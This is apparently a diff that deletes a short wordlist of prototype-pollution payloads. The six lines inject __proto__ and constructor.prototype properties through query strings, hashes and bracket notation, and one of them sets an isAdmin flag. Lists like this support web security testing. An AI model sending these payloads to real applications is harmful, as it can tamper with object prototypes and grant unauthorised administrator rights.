@@ -1,6 +1,0 @@
-constructor[prototype][isAdmin]=true
-constructor.prototype.isAdmin=true
-?__proto__[test]=test
-?__proto__.test=test
-?constructor[prototype][test]=test
-#__proto__[test]=test
